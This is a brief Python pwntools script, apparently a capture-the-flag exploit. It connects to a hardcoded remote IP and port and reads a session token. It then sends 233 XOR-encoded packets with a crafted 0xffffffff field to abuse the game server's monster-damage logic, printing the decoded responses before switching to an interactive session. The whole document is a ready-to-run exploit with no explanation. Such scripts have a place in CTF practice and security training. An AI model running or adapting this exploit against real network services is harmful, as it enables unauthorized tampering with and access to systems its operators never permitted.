#!/usr/bin/env python3
from pwn import *

def xor(A, B):
    ans = []
    for i in range(len(A)):
        ans.append(A[i] ^ B[i % 8])
    return bytes(ans)

r = remote("35.194.194.168", 7777)

token = r.recv()
print("token:", token)

for i in range(233):
    attack = p32(0x8) + xor(p32(0x1) + p32(0xffffffff), token)
    r.send(attack)
    response = r.recv()
    size = u32(response[:4])
    data = xor(response[4:], token)
    if i == 232:
        print(size, data)
        break
    status = u32(data[:4])
    monster_damage = u32(data[4:8])
    monster_hp = u64(data[8:])
    print("size:", size)
    print("status", status)
    print("monster_damage", monster_damage)
    print("monster_hp", monster_hp)

r.interactive()
